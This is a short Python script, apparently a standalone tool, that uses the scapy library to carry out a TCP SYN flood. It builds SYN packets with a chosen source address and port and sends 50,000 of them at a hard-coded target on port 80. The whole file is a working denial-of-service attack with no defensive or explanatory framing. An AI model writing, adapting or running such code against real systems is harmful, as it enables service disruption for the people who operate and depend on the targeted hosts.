from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send
import os


class SynFlood:
    def __init__(self, target_ip, target_port, source_ip, source_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_ip = source_ip
        self.source_port = source_port


    def send_syn_packet(self):
        # Set the IP header
        ip_header = IP(src=self.source_ip, dst=self.target_ip)

        # Set the TCP header
        tcp_header = TCP(sport=self.source_port, dport=self.target_port, flags="S")

        # Send the SYN packet
        packet = ip_header / tcp_header
        send(packet)

    def attack(self, number_packets):
        print(f"Process id : {os.getpid()}")
        for _ in range(number_packets):
            self.send_syn_packet()

if __name__ == '__main__':
    SynFlood("192.168.0.10", 80, "0.0.0.0", 12345).attack(50000)
